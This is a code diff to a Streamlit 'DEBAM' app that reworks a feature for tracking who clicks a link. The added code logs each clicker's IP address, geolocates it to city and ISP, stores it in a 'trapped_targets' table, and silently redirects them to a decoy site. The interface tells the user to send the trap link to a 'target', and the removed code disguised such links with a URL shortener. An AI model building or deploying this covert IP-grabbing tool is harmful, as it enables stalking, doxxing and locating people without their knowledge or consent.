@@ -511,53 +511,84 @@ elif menu == "🎣 Detect Fake Links (Phish-Check)":
         else: st.success("✅ Link looks standard.")
 
 elif menu == "📍 Track Who Clicks My Link":
-    st.title("🛰️ STRIKE MONITOR & AUTO-DISGUISE")
+    st.title("🛰️ STRIKE MONITOR & LIVE MAP")
+    st.write("Generate a tracked link. When clicked, DEBAM logs their IP and device info below.")
     
-    target_url = st.text_input("Final Destination (e.g., https://instagram.com/user)")
+    # =====================================================================
+    # 1. THE "CATCHER" LOGIC (Processes incoming targets when they click)
+    # =====================================================================
+    # Check if the URL parameters contain 'trap=active'
+    query_params = st.query_params
     
-    if st.button("GENERATE & DISGUISE LINK"):
-        if target_url:
-            base_app_url = "https://debams-os.streamlit.app/"
-            # 1. Create the 'Verify' link
-            long_link = f"{base_app_url}?verify=human&redir={target_url}"
-            
-            # 2. Automatically shorten it using TinyURL API
+    if query_params.get("trap") == "active":
+        # Get destination URL the target should end up at
+        destination = query_params.get("redir", "https://google.com")
+        
+        # Extract the target's public IP from request headers
+        headers = st.context.headers
+        visitor_ip = "Unknown"
+        if headers:
+            visitor_ip = headers.get("X-Forwarded-For", "Unknown").split(",")[0].strip()
+        
+        # Only log if it's a real external target hitting the link
+        if visitor_ip not in ["Unknown", "127.0.0.1", ""]:
+            # Perform the location lookup using the free GeoIP API
+            location_meta = "Location Lookup Failed"
             try:
-                api_url = f"http://tinyurl.com/api-create.php?url={long_link}"
-                response = requests.get(api_url, timeout=5)
-                short_link = response.text # This returns the tinyurl string
-                
-                st.success("✅ DISGUISED LINK CREATED SUCCESSFULLY")
-                
-                col1, col2 = st.columns(2)
-                with col1:
-                    st.write("**Professional Short Link:**")
-                    st.code(short_link) # This is what you send the target
-                
-                with col2:
-                    st.write("**Internal System Link:**")
-                    st.code(long_link)
-                
-                st.info("💡 You can now send the 'Professional Short Link' to the target. It looks like a standard redirect.")
-                
+                geo_res = requests.get(f"http://ip-api.com/json/{visitor_ip}", timeout=5).json()
+                if geo_res.get("status") == "success":
+                    country = geo_res.get("country", "Unknown")
+                    city = geo_res.get("city", "Unknown")
+                    isp = geo_res.get("isp", "Unknown")
+                    location_meta = f"{city}, {country} (ISP: {isp})"
+            except:
+                pass
+            
+            # Insert the data straight into your Supabase table
+            try:
+                supabase.table("trapped_targets").insert({
+                    "ip_address": visitor_ip,
+                    "location": location_meta,
+                    "destination": destination
+                }).execute()
             except Exception as e:
-                st.error("Shortener service timed out. Use the Internal Link below.")
-                st.code(long_link)
-        else:
-            st.warning("Please enter a destination URL first.")
+                pass # Fail silently so the target doesn't see a database error screen
+        
+        # HTML/JavaScript redirect to smoothly send them to the intended site
+        st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{destination}\'">', unsafe_allow_html=True)
+        st.write("Redirecting...")
+        st.stop() # Freeze further execution for the target browser
 
+    # =====================================================================
+    # 2. THE UI INTERFACE (What you see when you use the dashboard)
+    # =====================================================================
+    dest_url = st.text_input("Enter Destination URL (e.g., https://instagram.com)", value="https://facebook.com")
+    
+    if st.button("GENERATE TRAP"):
+        app_url = "https://debams-os.streamlit.app/" 
+        final_trap = f"{app_url}?trap=active&redir={dest_url}"
+        st.success("SEND THIS LINK TO TARGET:")
+        st.code(final_trap)
+    
     st.markdown("---")
-    st.subheader("📡 LIVE TARGET VISUALIZER")
+    st.subheader("💀 CAPTURED TARGET LOGS (LIVE)")
+    
     if st.button("Refresh Strike Data"):
-        logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
-        if logs.data:
-            df = pd.DataFrame(logs.data)
-            m = folium.Map(location=[6.5, 3.3], zoom_start=2, tiles="CartoDB dark_matter")
-            for _, row in df.iterrows():
-                if row.get('lat'):
-                    folium.Marker([row['lat'], row['lon']], popup=row['ip_address']).add_to(m)
-            folium_static(m)
-            st.table(df[['ip_address', 'city', 'clicked_at']])
+        try:
+            logs = supabase.table("trapped_targets").select("*").order("clicked_at", desc=True).execute()
+            if logs.data: 
+                st.table(logs.data)
+            else: 
+                st.info("No targets captured yet.")
+        except: 
+            st.error("Database connection issue.")
+            
+    if st.button("🗑️ PURGE LOGS"):
+        try:
+            supabase.table("trapped_targets").delete().neq("ip_address", "0").execute()
+            st.rerun()
+        except:
+            st.error("Could not clear database records.")
 
 elif menu == "🔍 Website Info & Email Grabber":
     st.title("🕵️‍♂️ WEBSITE & EMAIL SCRAPER")
